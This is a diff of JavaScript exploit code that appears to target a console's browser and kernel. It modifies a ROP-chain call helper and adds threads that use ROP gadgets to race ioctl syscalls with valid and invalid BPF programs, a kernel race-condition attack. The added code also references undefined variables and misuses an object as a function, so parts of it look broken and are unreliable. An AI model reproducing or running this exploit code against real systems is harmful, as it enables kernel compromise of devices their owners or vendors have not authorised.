@@ -955,7 +955,7 @@ var GadgetMap = function() {
             window.syscalls[syscallno] = window.libKernelBase.add32(i);
         }
     }
-    var chain = new window.RopChain;
+       var chain = new window.RopChain;
     var returnvalue;
     p.fcall_ = function(rip, rdi, rsi, rdx, rcx, r8, r9) {
         chain.clear();
@@ -970,9 +970,9 @@ var GadgetMap = function() {
         chain.push(window.gadgets["mov [rdi], rax"]); // rdi = rax
         
         chain.push(window.gadgets["pop rax"]); // pop rax
-        chain.push(p.leakval(0x41414241)); // where
+        chain.push(p.leakval(0x41414242)); // where
         
-        if (chain.run().low != 0x41414241) throw new Error("unexpected rop behaviour");
+        if (chain.run().low != 0x41414242) throw new Error("unexpected rop behaviour");
         returnvalue = p.read8(chain.ropframeptr.add32(0x3ff8)); //p.read8(chain.ropframeptr.add32(0x3ff8));
     }
     p.fcall = function()
@@ -1015,6 +1015,67 @@ var GadgetMap = function() {
   var backing = new Uint8Array(0x10000 + size);
 
   window.nogc.push(backing);
+  
+var thread2 = new window.rop();
+
+      thread2.clear();
+      thread2.push(window.gadgets["ret"]); // nop
+      thread2.push(window.gadgets["ret"]); // nop
+      thread2.push(window.gadgets["ret"]); // nop
+
+      thread2.push(window.gadgets["ret"]); // nop
+      chain(thread2);
+
+      p.write8(contextp, window.gadgets["ret"]); // rip -> ret gadget
+      p.write8(contextp.add32(0x10), thread2.stackBase); // rsp
+
+      var test = p.fcall(createThread, longjmp, contextp, stringify("GottaGoFast"));
+
+      window.nogc.push(contextz);
+      window.nogc.push(thread2);
+  
+   spawnthread(function (thread2) {
+        interrupt1 = thread2.stackBase;
+        thread2.push(window.gadgets["ret"]);
+        thread2.push(window.gadgets["ret"]);
+        thread2.push(window.gadgets["ret"]);
+        thread2.push(window.gadgets["pop rdi"]); // pop rdi
+        thread2.push(fd1); // what
+        thread2.push(window.gadgets["pop rsi"]); // pop rsi
+        thread2.push(0x8010427B); // what
+        thread2.push(window.gadgets["pop rdx"]); // pop rdx
+        thread2.push(bpf_valid_prog); // what
+        thread2.push(window.gadgets["pop rsp"]); // pop rsp
+        thread2.push(thread2.stackBase.add32(0x800)); // what
+        thread2.count = 0x100;
+        var cntr = thread2.count;
+        thread2.push(window.syscalls[54]); // ioctl
+        thread2.push_write8(thread2.stackBase.add32(cntr * 8), window.syscalls[54]); // restore ioctl
+        thread2.push(window.gadgets["pop rsp"]); // pop rdx
+        thread2.push(thread2.stackBase); // what
+      });
+
+      // ioctl() with invalid BPF program will be sprayed and eventually get used by the thread where the program has already been validated
+      spawnthread(function (thread2) {
+        interrupt2 = thread2.stackBase;
+        thread2.push(window.gadgets["ret"]);
+        thread2.push(window.gadgets["ret"]);
+        thread2.push(window.gadgets["ret"]);
+        thread2.push(window.gadgets["pop rdi"]); // pop rdi
+        thread2.push(fd2); // what
+        thread2.push(window.gadgets["pop rsi"]); // pop rsi
+        thread2.push(0x8010427B); // what
+        thread2.push(window.gadgets["pop rdx"]); // pop rdx
+        thread2.push(bpf_invalid_prog); // what
+        thread2.push(window.gadgets["pop rsp"]); // pop rsp
+        thread2.push(thread2.stackBase.add32(0x800)); // what
+        thread2.count = 0x100;
+        var cntr = thread2.count;
+        thread2.push(window.syscalls[54]); // ioctl
+        thread2.push_write8(thread2.stackBase.add32(cntr * 8), window.syscalls[54]); // restore ioctl
+        thread2.push(window.gadgets["pop rsp"]); // pop rdx
+        thread2.push(thread2.stackBase); // what
+      });
 
   var ptr     = p.read8(p.leakval(backing).add32(0x10));
   ptr.backing = backing;
